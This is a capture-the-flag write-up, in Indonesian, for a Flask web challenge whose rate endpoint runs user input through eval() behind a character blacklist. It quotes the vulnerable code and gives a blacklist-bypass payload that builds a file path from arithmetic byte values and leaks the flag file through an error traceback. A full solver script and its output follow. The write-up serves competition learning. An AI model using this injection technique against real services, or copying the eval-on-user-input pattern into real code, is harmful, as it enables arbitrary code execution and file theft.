# Writeup CTF — wpm-game

## Challenge Info

**Kategori:** Web
**Judul:** wpm-game
**Deskripsi:**
Website untuk menguji words per minute masih dalam tahap pengembangan dan belum sepenuhnya aman. Flag berada di `flag.txt`.

**Flag:**

```text
scriptCTF{t1ny_fl4g_1337_ae16ecc95921}
```

## Analisis Source Code

Aplikasi Flask memiliki endpoint utama `/` dan endpoint `/rate`. Endpoint `/rate` mengambil parameter `wpm` dari query string, lalu memvalidasinya menggunakan fungsi `check()`.

Potongan kode penting:

```python
@app.route("/rate")
def rate_wpm():
    try:
        wpm = request.args.get("wpm", "")
    except ValueError:
        return jsonify(error="invalid wpm"), 400

    if check(wpm):
        return "Invalid WPM!"

    return jsonify(verdict=rate(eval(wpm.lower())), wpm=float(wpm))
```

Kerentanan utamanya ada pada:

```python
eval(wpm.lower())
```

Parameter `wpm` dieksekusi langsung menggunakan `eval()`. Jadi, jika kita bisa membuat payload yang lolos fungsi `check()`, kita dapat menjalankan ekspresi Python di server.

## Filter / Blacklist

Fungsi `check()` melakukan blacklist terhadap banyak karakter dan keyword:

```python
disallowed = [
    ".", "_", "import", "=", ",", "'", '"', "attr", "global", "local",
    ";", ":", "^", "/", ">", "<", "{", "}", "m", "a", "not", "and",
    "or", "eval", "exec", "for", "in", "chr", "ord", "hex", "int",
    "repr", "str", "dir", "set", "len", "SENTENCES", "random",
    "request", "app", "flask"
]
```

Selain itu, input juga dibatasi:

```python
len(set(string)) > 18
```

Artinya payload harus:

1. Tidak mengandung karakter/keyword blacklist.
2. Hanya memakai karakter ASCII normal.
3. Memiliki maksimal 18 karakter unik.

Karena karakter seperti `/`, `.`, quote, underscore, dan huruf `a` diblokir, path seperti `/app/flag.txt` tidak bisa ditulis langsung.

## Recon Payload Awal

Payload awal yang dicoba:

```python
open(next(open(bytes([66+6*6]+[66+7*6]+[77+7+7+6]+[66+6*6+7-6]+[66-6-7-7]+[66+7*7+7-6]+[77+7*6+7-6]+[66+7*7+7-6]))))
```

Payload ini membangun string `flag.txt` menggunakan `bytes([...])`, lalu mencoba membuka file tersebut.

Hasilnya server mengembalikan `500 Internal Server Error` dengan traceback Werkzeug. Traceback menunjukkan error:

```text
FileNotFoundError: [Errno 2] No such file or directory: b'flag.txt'
```

Ini membuktikan payload berhasil masuk ke `eval()`, tetapi file `flag.txt` tidak berada di working directory saat itu. Traceback juga mengonfirmasi bahwa eksekusi terjadi pada `eval(wpm.lower())` di endpoint `/rate`.

## Bypass Path dengan bytes()

Karena `/`, `.`, dan huruf tertentu diblokir, path dibuat menggunakan operasi angka yang hanya memakai karakter aman.

Mapping byte yang dipakai:

```python
E = {
    46: "66-6-7-7",          # .
    47: "66-7-6-6",          # /
    97: "77+7+7+6",          # a
    102: "66+6*6",           # f
    103: "66+6*6+7-6",       # g
    108: "66+7*6",           # l
    112: "77+7*7-7-7",       # p
    116: "66+7*7+7-6",       # t
    120: "77+7*6+7-6",       # x
}
```

Dengan mapping tersebut, path `/app/flag.txt` dapat dibangun tanpa menulis karakter terlarang secara langsung.

## Ide Leak Flag

Payload final menggunakan pola:

```python
open(next(open(bytes(...))))
```

Penjelasan:

1. `bytes(...)` membangun path `/app/flag.txt`.
2. `open(bytes(...))` membuka file flag.
3. `next(open(...))` membaca baris pertama file flag.
4. `open(next(open(...)))` mencoba membuka file dengan nama berupa isi flag.

Karena tidak ada file bernama `scriptCTF{...}`, Python memunculkan `FileNotFoundError`. Error tersebut menampilkan nama file yang gagal dibuka, yaitu isi flag.

Dengan kata lain, kita tidak perlu mengembalikan flag lewat JSON. Cukup masukkan flag ke pesan error traceback.

## Solver

```python
#!/usr/bin/env python3
import re
import html
import requests

TARGET = "https://9c7da55e-1975-44dc-b680-c6ba9d9e299b.challs.scriptsorcerers.xyz"

E = {
    46: "66-6-7-7",          # .
    47: "66-7-6-6",          # /
    97: "77+7+7+6",          # a
    102: "66+6*6",           # f
    103: "66+6*6+7-6",       # g
    108: "66+7*6",           # l
    112: "77+7*7-7-7",       # p
    116: "66+7*7+7-6",       # t
    120: "77+7*6+7-6",       # x
}

def bpayload(path: str) -> str:
    arr = "+".join(f"[{E[ord(c)]}]" for c in path)
    return f"open(next(open(bytes({arr}))))"

payload = bpayload("/app/flag.txt")

print("[+] payload:", payload)
print("[+] unique chars:", len(set(payload.lower())))

r = requests.get(
    TARGET + "/rate",
    params={"wpm": payload},
    timeout=20,
)

text = html.unescape(r.text)

print("[+] status:", r.status_code)
print("[+] body length:", len(text))

m = re.search(r"scriptCTF\{[^}]+\}", text)

if m:
    print("[+] FLAG:", m.group(0))
else:
    print("[!] flag not found")
    print(text[:3000])
```

## Output

```text
[+] payload: open(next(open(bytes([66-7-6-6]+[77+7+7+6]+[77+7*7-7-7]+[77+7*7-7-7]+[66-7-6-6]+[66+6*6]+[66+7*6]+[77+7+7+6]+[66+6*6+7-6]+[66-6-7-7]+[66+7*7+7-6]+[77+7*6+7-6]+[66+7*7+7-6]))))
[+] unique chars: 18
[+] status: 500
[+] body length: 14648
[+] FLAG: scriptCTF{t1ny_fl4g_1337_ae16ecc95921}
```

## Flag

```text
scriptCTF{t1ny_fl4g_1337_ae16ecc95921}
```

